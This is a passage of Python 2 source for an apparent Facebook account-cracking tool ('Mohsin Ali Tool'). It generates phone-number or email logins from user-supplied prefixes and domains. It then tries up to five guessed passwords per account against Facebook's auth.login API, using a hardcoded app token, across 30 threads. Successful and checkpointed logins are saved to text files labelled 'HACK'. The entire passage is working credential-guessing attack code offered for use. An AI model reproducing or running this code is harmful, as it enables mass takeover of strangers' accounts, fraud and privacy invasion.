                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/india.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/india.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack done ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;92m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK File : save/bangla1.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 main.py')


def nguyen():
    os.system('clear')
    print logo
    print '\x1b[1;92m   357 - 175 - 037 - 918'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Choose Number \x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;96m Select Between 3 Digit !!') if len(c) < 3 else ''
        k = '+84'
        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97m Example : \x1b[1;92m Name+123'
        pass1 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] Password 1 : \x1b[92m')
        pass2 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;90mPassword 2 : \x1b[92m')
        pass3 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] Password 3 : \x1b[92m')
        pass4 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;90mPassword 4 : \x1b[92m')
        pass5 = raw_input('\x1b[1;97m[\x1b[92m\xe2\x80\xa2\x1b[1;97m] Password 5 : \x1b[92m')
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ BACK ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't Close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/nguyen.txt', 'a')
                okb.write('[HACK] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/nguyen.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/nguyen.txt', 'a')
                    okb.write('[HACK] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/nguyen.txt', 'a')
                    cps.write('[CHECK] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/nguyen.txt', 'a')
                        okb.write('[HACK] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/nguyen.txt', 'a')
                        cps.write('[CHECK]' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass4
                            okb = open('save/nguyen.txt', 'a')
                            okb.write('[HACK]' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass4
                            cps = open('save/nguyen.txt', 'a')
                            cps.write('[CHECK' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass5
                                okb = open('save/nguyen.txt', 'a')
                                okb.write('[HACK]' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass5
                                cps = open('save/nguyen.txt', 'a')
                                cps.write('[CHECK]' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK File : save/Mohsin.txt'
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 MOHSIN.py')


def crack_email():
    os.system('clear')
    print logo
    try:
        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example\x1b[1;97m :\x1b[1;92m syco.ayu '
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Name Target\x1b[1;97m :\x1b[1;92m ')
        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example \x1b[1;97m: \x1b[1;92m@hotmail.com'
        k = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Domain Email\x1b[1;97m :\x1b[1;92m ')
        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example \x1b[1;97m: \x1b[1;92mSyco123'
        pass1 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password1\x1b[1;97m :\x1b[1;92m ')
        pass2 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;90m Password2\x1b[1;97m :\x1b[1;92m ')
        pass3 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password3\x1b[1;97m :\x1b[1;92m ')
        pass4 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;90m Password4\x1b[1;97m :\x1b[1;92m ')
        pass5 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password5\x1b[1;97m :\x1b[1;92m ')
        idlist = '..txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Not Found'
        raw_input('\n[ BACK ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Email \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(1)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't Close")
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/email.txt', 'a')
                okb.write('[Berhasil] ' + c + user + k + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/email.txt', 'a')
                cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/email.txt', 'a')
                    okb.write('[ok] ' + c + user + k + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/email.txt', 'a')
                    cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/email.txt', 'a')
                        okb.write('[Berhasil] ' + c + user + k + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/email.txt', 'a')
                        cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass4
                            okb = open('save/email.txt', 'a')
                            okb.write('[Berhasil] ' + c + user + k + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass4
                            cps = open('save/email.txt', 'a')
                            cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass5
                                okb = open('save/email.txt', 'a')
                                okb.write('[Berhasil]' + c + user + k + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass5
                                cps.open('save/email.txt', 'a')
                                cps.write('[Cekpoint]' + c + user + k + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Done ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK File : save/email.txt'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 MOHSIN.py')


if __name__ == '__main__':
    os.system('clear')
    jalan('Mohsin Ali Tool :)')
    time.sleep(2)
    menu()
